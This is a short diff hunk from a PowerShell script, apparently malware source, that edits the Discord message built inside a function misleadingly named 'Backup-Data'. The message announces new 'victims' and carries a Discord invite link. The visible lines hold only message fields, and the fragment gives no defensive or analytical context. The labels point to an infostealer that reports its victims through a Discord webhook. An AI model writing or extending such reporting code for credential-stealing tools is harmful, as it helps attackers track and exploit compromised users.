@@ -1230,8 +1230,8 @@ function Backup-Data {
         "url"        = "https://discord.com/invite/ghr"
         "embeds"     = @(
             @{
-                "title"       = "New victim's x Sahm"
-                "url"         = "discord.gg/ghr"
+                "title"       = "victims x Sahm"
+                "url"         = "https://discord.com/invite/ghr"
                 "description" = "Nothing New with Sahm"
                 "color"       = "1705570"
                 "footer"      = @{
